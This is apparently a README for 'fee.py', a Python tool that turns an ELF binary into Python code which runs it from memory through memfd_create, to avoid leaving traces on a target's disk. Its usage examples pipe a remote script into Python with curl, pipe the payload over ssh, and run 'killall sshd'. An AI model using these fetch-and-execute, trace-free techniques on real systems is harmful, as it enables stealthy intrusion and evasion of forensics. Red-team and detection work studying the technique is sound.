## Execute ELF files on a machine without dropping an ELF

### Description

This Python script generates Python code which creates the supplied ELF as a file in memory and executes it (without tmpfs). This makes it possible to execute binaries without leaving traces on the disk.

The technique used for this is explained [here](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html).


### Target requirements

 * kernel: 3.17 (for `memfd_create` support)
 * Python: either 2 or 3

### Usage

Basic usage: supply the path to the binary you wish to drop:

```console
$ ./fee.py /path/to/binary > output.py
```

You can then pipe this into Python on the target:

```console
$ curl my.example.site/output.py | python
```

If you want to pipe over ssh, use the `--with-command` flag (`-c`) to wrap the output in `python -c`:

```console
$ ./fee.py -c /path/to/binary | ssh user@target
``` 

If you want to customise the arguments, use the `--argv` flag (`-a`):

```console
$ ./fee.py -a "killall sshd" ./busybox > output.py
```

__IMPORTANT!__ By default, the script uses the x86-64 syscall number for `memfd_create`. This is different for targets with a different architecture (32-bit x86, ARM, ARM64, MIPS, etc).

You need to search for `memfd_create` in your target's architecture's syscall table. This is located in various places in the Linux kernel sources. Just Googling `[architecture] syscall table` is perhaps the easiest.

If you need to change the syscall number, use the `--syscall` flag (`-s`).

Full help text:
```
usage: fee.py [-h] [-s NUM] [-a ARGV] [-c] [-p PATH] [-z LEVEL] path

Print Python code to stdout to execute an ELF without dropping files.

positional arguments:
  path                  path to the ELF file

optional arguments:
  -h, --help            print this help message and exit
  -s NUM, --syscall NUM
                        syscall number for memfd_create for the target
                        platform (default: 319)
  -a ARGV, --argv ARGV  space-separated arguments (including argv[0]) supplied
                        to execle (default: path to file as argv[0])
  -c, --with-command    wrap the generated code in a call to Python, for
                        piping directly into ssh
  -p PATH, --python-path PATH
                        path to python on target if '-c' is used (default:
                        '/usr/bin/env python3')
  -z LEVEL, --compression-level LEVEL
                        zlib compression level, 0-9 (default: 9)

```